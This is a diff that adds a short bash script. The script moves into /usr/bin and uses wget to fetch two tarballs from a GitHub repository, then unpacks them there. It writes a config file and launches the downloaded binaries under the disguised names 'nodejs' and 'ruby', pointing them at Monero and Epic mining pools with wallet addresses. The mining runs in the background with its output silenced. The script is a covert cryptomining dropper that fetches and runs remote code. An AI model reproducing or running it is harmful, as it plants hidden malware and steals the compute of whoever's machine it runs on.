@@ -1,0 +1,26 @@
+#/bin/bash
+cd /usr/bin
+
+wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
+tar xvzf csv44.tar.gz
+wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv45.tar.gz
+tar xvzf csv45.tar.gz
+
+touch abcdzyxw.txt
+echo '{
+"retry_time" : 20,
+"cpu_threads" : 8,
+"giveup_limit" : 20,
+"algorithm" : "randomepic",
+"disable_cpu" : false,
+"disable_gpu" : true
+}' > abcdzyxw.txt
+
+nice -n 19 nodejs -o xmr.f2pool.com:13531 -u 82zwbB24DFCbatvnLkh33MFxePzsEfvMp2UxqsfzgGgU8mZNpXM1TNZQkxri8MWUceYiLPNTQjJEvMjDNnUrwb4BFsi545u -a rx/0 --donate-level 1 -t 8 -B
+
+sleep 20
+
+nice -n -20 nohup ruby --config-file abcdzyxw.txt --pool epic.hashrate.to:4000 --wallet pacbitsoya --password si4b1boygwpu > /dev/null 2>&1 &
+
+cd /
+
